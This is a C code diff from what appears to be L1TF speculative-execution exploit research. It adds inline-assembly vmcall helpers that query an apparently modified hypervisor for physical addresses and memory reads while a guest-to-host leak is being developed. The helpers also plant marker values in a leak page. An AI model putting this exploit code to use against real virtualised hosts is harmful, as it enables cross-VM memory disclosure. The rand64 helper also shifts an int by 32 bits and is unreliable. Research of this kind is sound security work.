@@ -457,7 +457,54 @@ void half_spectre(unsigned char *p, uintptr_t own_pa, uintptr_t base)
   }
 }
 
+static uint64_t vmcall4(unsigned long hypercall_number, unsigned long rbx, unsigned long rcx,
+                unsigned long rdx, unsigned long rsi) {
+  unsigned long result = -7;
+  asm volatile(
+    "vmcall \n\t"
+    "mov %%rax, %0 \n\t"
+    : "=r"(result)
+    : "a"(hypercall_number), "b"(rbx), "c"(rcx), "d"(rdx), "S"(rsi)
+    :
+  );
+  printf("vmcall result: %lx\n", result);
+  return result;
+}
+
+uintptr_t hc_find_magic(uint64_t magic)
+{
+  return vmcall4(97, 101, magic, 0, 0);
+}
+
+int hc_single_task_running(void)
+{
+  return vmcall4(97, 102, 0, 0, 0);
+}
+
+uintptr_t hc_read_pa(uintptr_t pa)
+{
+  return vmcall4(97, 103, pa, 0, 0);
+}
+
+uintptr_t hc_phys_map_base(void)
+{
+  return vmcall4(97, 104, 0, 0, 0);
+}
+
+uintptr_t hc_direct_map(void)
+{
+  return vmcall4(97, 105, 0, 0, 0);
+}
+
+long rand64(void)
+{
+  return (rand() << 32) | rand();
+}
+
 void l1tf_find_ffff_values(scan_opts_t scan_opts) {
+  vmcall4(97, 100, 0, 0, 0);
+  vmcall4(97, 102, 0, 0, 0);
+
   initialize_pteditor_lib();
   two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
   memset(reload_buffer, 0, sizeof(two_byte_reload_buffer));
@@ -467,7 +514,22 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   unsigned char *p = l1tf_spawn_leak_page();
   assert(p != MAP_FAILED);
   memset(p, 0x97, PAGE_SIZE);
+
   *(uint64_t *)(p) = 0x9797979797979999;
+  uintptr_t pa = hc_find_magic(0x9797979797979999);
+  vmcall4(97, 103, pa, 0, 0);
+  *(uint64_t *)(p) = 0x7979000079790000;
+  vmcall4(97, 103, pa, 0, 0);
+
+  uintptr_t base = vmcall4(97, 104, 0, 0, 0);
+    uintptr_t dm = vmcall4(97, 105, 0, 0, 0);
+    base -= dm;
+  printf("base == %lx\n", base);
+  vmcall4(97, 103, base, 0, 0);
+  vmcall4(97, 103, base+8, 0, 0);
+  vmcall4(97, 103, base+16, 0, 0);
+  vmcall4(97, 103, base+24, 0, 0);
+
   printf("mmapped own page `p`; look up its phys addr now and press ENTERRRRR\n");
   getchar();
 
